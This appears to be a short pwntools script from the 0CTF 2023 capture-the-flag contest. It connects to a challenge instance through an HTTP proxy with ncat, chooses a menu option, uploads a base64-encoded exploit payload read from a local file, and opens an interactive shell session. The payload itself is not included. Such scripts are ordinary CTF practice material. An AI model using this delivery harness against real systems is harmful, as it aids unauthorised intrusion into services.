from pwn import *
import base64

p = process("ncat --proxy-type http --proxy instance.0ctf2023.ctf.0ops.sjtu.cn:18081 yxxj9vwbhhyhg4cv 1".split(" "))

p.sendlineafter(b"> ", b"2")

sc = open("exp.dat", "rb").read()
p.sendlineafter(b": \n", base64.b64encode(sc))

p.interactive()